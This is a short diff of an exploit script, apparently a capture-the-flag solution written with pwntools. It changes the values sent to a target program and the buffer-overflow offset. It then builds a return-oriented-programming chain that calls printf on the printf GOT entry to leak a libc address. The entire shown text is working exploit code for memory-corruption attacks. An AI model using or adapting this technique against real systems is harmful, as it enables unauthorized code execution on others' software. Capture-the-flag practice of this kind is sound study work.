@@ -17,10 +17,10 @@ def conn():
 def solve(): 
     global p
     p = conn()
-    p.sendline("13523148")
+    p.sendline("13523097")
     p.sendline("7")
 
-    offset = 224 + 8
+    offset = 144 + 8
     rop = ROP(elf)
     rop.call(rop.ret.address)
     rop.printf(elf.got["printf"])
